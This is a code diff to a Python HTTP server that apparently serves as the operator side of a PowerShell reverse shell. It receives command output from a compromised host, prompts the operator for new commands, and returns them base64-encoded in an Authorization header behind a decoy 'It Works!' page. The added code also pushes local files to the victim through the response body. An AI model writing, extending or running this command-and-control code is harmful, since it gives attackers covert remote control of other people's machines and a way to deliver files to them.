@@ -30,6 +30,16 @@ class myHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         self.send_response(200)
+        html = "<html><body><h1>It Works!</h1></body></html>"
+
+        result = self.parseResult()
+        pwd = self.getPwd(result)
+        self.printResult(result)
+        command = self.newCommand(pwd)
+        self.sendCommand(command, html)
+        return
+
+    def parseResult(self):
         content_len = int(self.headers.get('Content-Length', 0))
         test_data = self.rfile.read(content_len)
         result = (test_data[7:]).decode('utf-8')
@@ -40,27 +50,49 @@ class myHandler(BaseHTTPRequestHandler):
         except:
             #print ("result without b64 --> {}".format(result))
             pass
-
         result=result.split('_n1w_')
+        return result
+
+    def getPwd(self, result):
         if result[0] == "":
             del result[0]
         pwd = result[-1].strip()
         del result[-1] # Deleting pwd from result
+        return pwd
 
+    def printResult(self, result):
         for string in result:
             print(colored(string, 'blue'))
 
+    def newCommand(self, pwd):
         if (pwd == "start"):
             input(colored("[!] New Connection, please press ENTER!",'red'))
             command = "pwd"
         else:
-            command = input("PS {}>> ".format(pwd)) + "; pwd"
+            command = input("PS {}>> ".format(pwd)) + " ;pwd"
+        return command
+
+    def sendCommand(self, command, html):
+        if (command.split(" ")[0] == "upload"):
+            functions = Functions()
+            filename = command.split(" ")[1]
+            content = functions.upload(filename)
+            html = content.decode('utf-8')
+
         CMD = base64.b64encode(command.encode())
         self.send_header('Authorization',CMD.decode('utf-8'))
         self.end_headers()
-        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
-        return
+        self.wfile.write(html.encode())
 
+
+class Functions():
+    def upload(self, filename):
+        try:
+            with open(filename, mode='rb') as file: # b is important -> binary
+                content = file.read()
+                return base64.b64encode(content)
+        except FileNotFoundError:
+            print (colored("\r\n[!] File not found!\n", "red"))
 
 def main():
 
